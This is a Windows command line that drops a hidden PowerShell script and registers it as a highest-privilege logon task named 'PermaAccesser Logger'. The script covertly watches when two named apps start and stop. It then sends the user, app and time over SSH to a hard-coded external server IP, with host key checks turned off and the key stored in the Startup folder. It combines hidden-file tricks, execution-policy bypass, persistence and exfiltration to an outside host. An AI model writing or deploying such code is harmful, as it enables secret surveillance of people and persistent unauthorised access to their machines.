$startupFile = 'C:\Users\dominik\.windows\LogToServer.ps1'; 
$lines = @('# --- KONFIGURATION ---','$TargetApps = @(''AURAHentaiCards'', ''Everlusting Life'')','$ServerUser = ''ubuntu''','$ServerIP = ''193.123.189.154''','$ServerPort = 22','$RemotePath = ''/home/ubuntu/log.txt''','$SshKeyPath = ''C:\Users\dominik\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\id_rsa_server''','# ----------------------','Write-Host ''Ueberwachung gestartet. Warte auf Events...''','$StartupLog = (Get-Date -Format ''yyyy-MM-dd HH:mm:ss'') + '' | Logger gestartet''','Write-Host $StartupLog','$RemoteCmd = ''cat >> '' + $RemotePath','$TargetHost = $ServerUser + ''@'' + $ServerIP','$StartupLog | & ssh -o StrictHostKeyChecking=no -o BatchMode=yes -i $SshKeyPath -p $ServerPort $TargetHost $RemoteCmd 2>$null','Register-WmiEvent -Class Win32_ProcessStartTrace -SourceIdentifier ProcStart | Out-Null','Register-WmiEvent -Class Win32_ProcessStopTrace -SourceIdentifier ProcStop | Out-Null','while ($true) {','    $Event = Wait-Event','    try {','        $ProcessName = $Event.SourceEventArgs.NewEvent.ProcessName','        if (-not $ProcessName) { continue }','        $AppName = [System.IO.Path]::GetFileNameWithoutExtension($ProcessName)','        if ($TargetApps -contains $AppName) {','            $Time = (Get-Date).ToString(''yyyy-MM-dd HH:mm:ss'')','            $User = $env:USERNAME','            $Action = if ($Event.SourceIdentifier -eq ''ProcStart'') { ''gestartet'' } else { ''beendet'' }','            $LogMessage = $Time + '' | Client: '' + $Computer + '' | User: '' + $User + '' | Task: '' + $AppName + '' | '' + $Action','            Write-Host $LogMessage','            $LogMessage | & ssh -o StrictHostKeyChecking=no -o BatchMode=yes -i $SshKeyPath -p $ServerPort $TargetHost $RemoteCmd 2>$null','        }','    } catch { } finally {','        if ($Event) { Remove-Event -EventIdentifier $Event.EventIdentifier }','    }','}'); $lines | Set-Content -Path $startupFile -Encoding utf8; try { $item = Get-Item -LiteralPath $startupFile; $item.Attributes = $item.Attributes -bor [System.IO.FileAttributes]::Hidden -bor [System.IO.FileAttributes]::System } catch {}" & schtasks /Create /TN "PermaAccesser Logger" /SC ONLOGON /RL HIGHEST /RU %USERNAME% /F /TR "powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File \"C:\Users\dominik\.windows\LogToServer.ps1\"